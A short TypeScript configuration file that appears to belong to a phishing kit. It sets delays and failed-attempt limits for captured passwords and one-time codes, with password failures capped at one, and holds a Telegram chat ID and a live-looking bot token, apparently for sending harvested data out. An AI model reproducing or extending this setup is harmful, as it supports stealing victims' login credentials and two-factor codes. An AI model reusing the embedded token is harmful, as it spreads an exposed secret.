interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
		code_input_enabled: boolean;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 10000,
		max_failed_code_attempts: 3,
		max_failed_password_attempts: 1,
		password_loading_time: 4000,
		code_input_enabled: true,
	},
	telegram: {
		data_chatid: "7211586401",
		data_token: "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
